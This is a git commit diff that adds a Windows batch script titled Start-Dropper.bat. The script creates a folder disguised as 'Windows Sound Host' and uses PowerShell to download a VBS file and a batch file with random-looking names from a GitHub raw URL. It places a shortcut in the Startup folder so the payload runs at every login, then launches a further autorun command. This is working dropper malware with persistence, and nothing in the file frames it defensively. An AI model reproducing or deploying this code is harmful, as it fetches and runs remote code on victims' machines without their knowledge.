082cd4542bd0545d469e30d6b138cb5b4b02287f
[LONG] <91588850+LONG-BAT@users.noreply.github.com>
2026-01-17 23:28:28 -0700

    Add files via upload

--- Start-Dropper.bat
+++ Start-Dropper.bat
@@ -1,11 +1,21 @@
 @echo off 
 cd \ 
-cd c:\"program files "
-mkdir Windows Sound Host
-cd Windows Sound Host 
-set path1= C:\"program files"\"Windows Sound Host\" 
+if not exist %userprofile%\documents\"Windows Sound Host" ( 
+    mkdir "Windows Sound Host"
+)
+set path1= %userprofile%\documents\"Windows Sound Host"
+cd %path1%
+pause 
 
-powershell -NoLogo -NonInteractive Invoke-WebRequest 'gitURL' -Outfile ./15a65da65s1d8w86s51d8aw.vbs; Invoke-WebRequest 'gitURL' -Outfile ./116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat 
-powershell -NoLogo -NonInteractive -WindowStyle hidden -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\program files\Windows Sound Host\');$s.TargetPath='%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';$s.Save()" 
+
+powershell Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/i.vbs' -Outfile ./15a65da65s1d8w86s51d8aw.vbs; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/snds.bat' -Outfile ./116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat; Invoke-WebRequest ''
+pause 
+if not exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\116161as5d1a5d3a21sd51aw13s1d85aw1d35.lnk ( 
+    powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\116161as5d1a5d3a21sd51aw13s1d85aw1d35.lnk');$s.TargetPath='%userprofile%\documents\Windows Sound Host\116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat';$s.Save()"
+    
+)
 timeout 150
-wscript.exe "%path1%15a65da65s1d8w86s51d8aw.vbs" "%path%116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat"
+start autorun.cmd
+
+
+
